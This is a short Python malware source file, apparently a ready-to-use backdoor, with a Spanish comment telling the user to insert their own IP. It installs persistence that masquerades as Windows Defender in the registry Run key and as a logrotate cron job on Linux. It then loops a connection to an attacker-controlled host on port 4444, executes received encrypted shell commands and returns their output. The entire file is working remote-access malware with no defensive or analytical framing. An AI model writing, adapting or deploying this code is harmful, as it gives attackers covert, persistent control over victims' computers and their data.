import socket
import platform
import subprocess
import os
import sys
from utils.crypt import AESEncryptor

class Backdoor:
    def __init__(self, host="TU_IP_AQUÍ", port=4444):  # ← Cambia TU_IP_AQUÍ por tu IP real
        self.host = host
        self.port = port
        self.cryptor = AESEncryptor(key="SUPER_SECRET_KEY")

    def _add_persistence(self):
        if platform.system() == "Windows":
            import winreg
            try:
                key = winreg.HKEY_CURRENT_USER
                path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as regkey:
                    winreg.SetValueEx(regkey, "WindowsDefender", 0, winreg.REG_SZ, sys.executable + " " + __file__)
            except: pass
            
        elif platform.system() == "Linux":
            try:
                cron_path = "/etc/cron.hourly/" if os.path.exists("/etc/cron.hourly") else f"{os.path.expanduser('~')}/.cron_hourly/"
                os.makedirs(cron_path, exist_ok=True)
                
                with open(f"{cron_path}logrotate", "w") as f:
                    f.write(f"#!/bin/sh\npython3 {os.path.abspath(__file__)} >/dev/null 2>&1\n")
                os.chmod(f"{cron_path}logrotate", 0o755)
            except: pass

    def run(self):
        self._add_persistence()
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    while True:
                        cmd_encrypted = s.recv(1024)
                        cmd = self.cryptor.decrypt(cmd_encrypted).decode()
                        if cmd == "exit":
                            break
                        output = subprocess.getoutput(cmd)
                        s.send(self.cryptor.encrypt(output))
            except:
                pass
